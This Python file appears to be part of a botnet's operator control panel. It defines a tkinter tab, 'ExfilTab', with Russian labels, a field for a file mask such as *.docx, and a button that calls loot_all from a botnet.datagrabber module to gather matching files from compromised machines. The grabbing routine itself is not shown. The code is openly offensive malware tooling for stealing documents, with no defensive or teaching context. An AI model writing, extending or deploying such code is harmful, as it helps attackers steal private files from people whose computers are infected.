import tkinter as tk
from tkinter import messagebox
from botnet.datagrabber import loot_all

class ExfilTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="Маска файлов (например *.docx):").pack(anchor=tk.W, padx=5, pady=5)
        self.mask_entry = tk.Entry(self, width=30)
        self.mask_entry.pack(padx=5)
        tk.Button(self, text="Запустить сбор данных", command=self.start_exfil).pack(pady=20)

    def start_exfil(self):
        mask = self.mask_entry.get()
        loot_all(mask=mask)
        messagebox.showinfo("Exfil", f"Сбор данных завершён (маска: {mask})")
